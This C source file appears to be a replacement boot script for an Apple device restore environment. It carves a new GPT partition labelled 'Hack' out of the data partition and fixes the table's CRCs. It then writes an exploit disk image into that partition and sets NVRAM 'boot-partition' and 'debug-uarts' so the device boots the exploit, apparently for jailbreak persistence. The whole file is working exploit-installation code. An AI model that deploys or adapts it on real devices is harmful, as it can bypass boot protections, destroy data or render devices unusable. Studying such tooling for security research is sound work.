#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>
#include <spawn.h>
#include <fstab.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mount.h>

#include "gpt.h"

#define DATA_PARTITION_BDEV "/dev/disk0s1s2"
#define DATA_PARTITION_MNT  "/mnt2"

#define EXPLOIT_PARTITION_BDEV  "/dev/rdisk0s1s3"
#define EXPLOIT_PATH            "/exploit.dmg"
#define EXPLOIT_LEN             (0x20000)

static
uint8_t GPTHFSSignature[] = {0x00, 0x53, 0x46, 0x48, 0x00, 0x00, 0xAA, 0x11, 0xAA, 0x11, 0x00, 0x30, 0x65, 0x43, 0xEC, 0xAC};

#define REQUIRE_NOERR(__expr, __label) \
    do { \
        if ((__expr) != 0) { \
            goto __label; \
        } \
    } while(0);

int spawn(char *const argv[]) {
    printf("executing %s\n", argv[0]);

    pid_t pid;
    posix_spawn(&pid, argv[0], NULL, NULL, argv, NULL);

    int status;
    waitpid(pid, &status, 0);

    if (!WIFEXITED(status)) {
        printf("%s terminated abnormally\n", argv[0]);
        return -1;
    }

    int ret = WEXITSTATUS(status);

    printf("%s exited with code %d\n", argv[0], ret);

    return ret;
}

int mount_hfs(const char *dev, const char *mountpoint) {
    printf("mounting HFS @ %s to %s\n", dev, mountpoint);

    const char *argv[] = {
        "/sbin/mount_hfs",
        dev,
        mountpoint,
        NULL
    };

    return spawn(argv);
}

int nvram_delete(const char *var) {
    printf("deleting NVRAM variable \"%s\"\n", var);

    const char *argv[] = {
        "/usr/sbin/nvram",
        "-d",
        var,
        NULL
    };

    return spawn(argv);
}

int nvram_set(const char *var, const char *value) {
    char a[256] = { 0 };
    snprintf(a, sizeof(a), "%s=%s", var, value);

    printf("setting NVRAM variable \"%s\" to \"%s\"\n", var, value);

    char *argv[] = {
        "/usr/sbin/nvram",
        a,
        NULL
    };

    return spawn(argv);
}

#define HFSRESIZE           (0x80086802)
#define DKIOCGETBLOCKSIZE   _IOR('d', 24, uint32_t)

int hfs_resize(const char *path, uint64_t size) {
    printf("resizing %s to %llu bytes\n", path, size);

    int err;
    if ((err = fsctl(path, HFSRESIZE, &size, 0)) != 0) {
        printf("HFS resize failed. errno=%i\n", err);
        return -1;
    };

    return 0;
}

int exploit_install() {
    printf("====== installing the exploit ======\n");

    int ret = -1;
    int exploit_part_fd = -1;
    int exploit_image_fd = -1;
    void *hdr_blocks = NULL;
    void *exploit_buf = NULL;

    /* Data paratition gotta be mounted before opening GPT, apparently */
    REQUIRE_NOERR(
        mount_hfs(DATA_PARTITION_BDEV, DATA_PARTITION_MNT), out);

    /* opening the fake GPT */
    int gpt_fd = open("/dev/rdisk0s1", O_RDWR | O_SHLOCK);
    if (gpt_fd < 0) {
        printf("failed to open " "/dev/rdisk0s1" "?!\n");
        goto out;
    }

    /* getting block size of our disk */
    uint32_t blocksize = -1;
    REQUIRE_NOERR(
        ioctl(gpt_fd, DKIOCGETBLOCKSIZE, &blocksize), out);

    printf("block size - %d\n", blocksize);

    /* we'll read GPT header and partition table at the same time */
    uint64_t read_len = blocksize * 2;

    hdr_blocks = malloc(read_len);

    if (pread(gpt_fd, hdr_blocks, read_len, blocksize) != read_len) {
        printf("failed to read GPT?!\n");
        goto out;
    }

    GPTHeader *hdr = hdr_blocks;

    /* sanity checking the header */
    if (memcmp(hdr->signature, GPT_MAGIC, sizeof(hdr->signature)) != 0) {
        printf("unexpected GPT magic\n");
        goto out;
    }

    if (hdr->revision != 0x1) {
        printf("unexpected GPT revision (0x%x)\n", hdr->revision);
        goto out;
    }

    if (hdr->ptab_lba != 2) {
        printf("unexpected GPT ptab LBA (0x%llx)\n", hdr->ptab_lba);
        goto out;
    }

    if (hdr->ptab_cnt * hdr->ptab_entry_size > blocksize) {
        printf("partition entries take more than 1 block?!\n");
        goto out;
    }

    GPTPartition *parts = hdr_blocks + blocksize;

    /* calculating new Data partition length */
    uint64_t data_len = (parts[1].last_lba - parts[1].first_lba + 1) * blocksize;
    uint64_t new_data_len = data_len - EXPLOIT_LEN;

    /* resizing! */
    REQUIRE_NOERR(
        hfs_resize(DATA_PARTITION_MNT, new_data_len), out);

    parts[1].last_lba = parts[1].first_lba + (new_data_len - EXPLOIT_LEN) / blocksize - 1;

    /* filling out the exploit partition */
    memcpy(parts[2].signature, GPTHFSSignature, sizeof(GPTHFSSignature));
    arc4random_buf(parts[2].guid, sizeof(parts[2].guid));
    parts[2].first_lba = parts[1].last_lba + 1;
    parts[2].last_lba = parts[1].last_lba + (EXPLOIT_LEN / blocksize);
    memcpy(parts[2].name, (const char[]){'H', 0, 'a', 0, 'c', 0, 'k', 0}, 8);

    /* fixing CRCs */
    hdr->ptab_cnt++;
    hdr->ptab_crc32 = crc32(0, hdr_blocks + blocksize, hdr->ptab_cnt * hdr->ptab_entry_size);

    hdr->hdr_crc32 = 0;
    hdr->hdr_crc32 = crc32(0, (void *)hdr, sizeof(*hdr));

    /* write the updated GPT */
    printf("writing GPT...\n");
    if (pwrite(gpt_fd, hdr_blocks, read_len, blocksize) != read_len) {
        printf("failed to write GPT!\n");
        goto out;
    }

    close(gpt_fd);
    gpt_fd = -1;

    free(hdr_blocks);
    hdr_blocks = NULL;

    printf("syncing disks\n");
    for (int i = 0; i < 10; i++) {
        sync();
    }

    /* reading the exploit image */
    exploit_image_fd = open(EXPLOIT_PATH, O_RDONLY);
    if (exploit_image_fd < 0) {
        printf("failed to open " EXPLOIT_PATH "?!\n");
        goto out;
    }

    exploit_buf = malloc(EXPLOIT_LEN);

    int r = read(exploit_image_fd, exploit_buf, EXPLOIT_LEN);

    close(exploit_image_fd);
    exploit_image_fd = -1;

    if (r != EXPLOIT_LEN) {
        printf("failed to read " EXPLOIT_PATH "?!\n");
        goto out;
    }

    /* opening exploit partition */
    exploit_part_fd = open(EXPLOIT_PARTITION_BDEV, O_WRONLY);
    if (exploit_part_fd < 0) {
        printf("failed to open " EXPLOIT_PARTITION_BDEV "?!\n");
        goto out;
    }

    /* writing out the exploit image */
    int w = pwrite(exploit_part_fd, exploit_buf, EXPLOIT_LEN, 0);

    close(exploit_part_fd);
    exploit_part_fd = -1;

    if (w != EXPLOIT_LEN) {
        printf("failed to write exploit image?!\n");
        goto out;
    }

    printf("successfully written the exploit!\n");

    free(exploit_buf);
    exploit_buf = NULL;

    printf("syncing disks\n");
    for (int i = 0; i < 10; i++) {
        sync();
    }

    /* setting "boot-partition" var to 3rd partition */
    REQUIRE_NOERR(nvram_set(
        "boot-partition", "2"), out);

    /* XXX end users do not really need it? */
    REQUIRE_NOERR(nvram_set(
        "debug-uarts", "3"), out);

    ret = 0;

out:
    if (gpt_fd > 0) {
        close(gpt_fd);
    }

    if (exploit_part_fd > 0) {
        close(exploit_part_fd);
    }

    if (exploit_image_fd > 0) {
        close(exploit_image_fd);
    }

    if (hdr_blocks) {
        free(hdr_blocks);
    }

    if (exploit_buf) {
        free(exploit_buf);
    }

    return ret;
}

int reboot(int howto);

int main(int argc, const char *argv[]) {
    int ret = -1;
    struct fstab *tab = NULL;
    void *v3[11] = { 0 };

    printf("====== rc.boot start ======\n");

    if (argc > 1 && strcmp(argv[1], "--test") == 0) {
        printf("RUNNING IN TEST MODE\n");
        return exploit_install();
    }

    tab = getfsfile("/");
    if (!tab) {
        goto fail;
    }

    v3[0] = tab->fs_spec;
    if (mount(tab->fs_vfstype, "/", 0x10001, v3) != 0) {
        goto fail;
    }

    umask(0);
    
    char *restored_argv[] = {
        "/usr/local/bin/restored_external",
        "-server",
        NULL
    };

    REQUIRE_NOERR(
        spawn(restored_argv), fail);

    REQUIRE_NOERR(
        exploit_install(), fail);

    printf("all done! rebooting...\n");
    goto out;

fail:
    printf("something FAILED!\n");
    printf("clearing \"boot-partition\" and rebooting...\n");

    nvram_delete("boot-partition");

out:
    reboot(0);
}
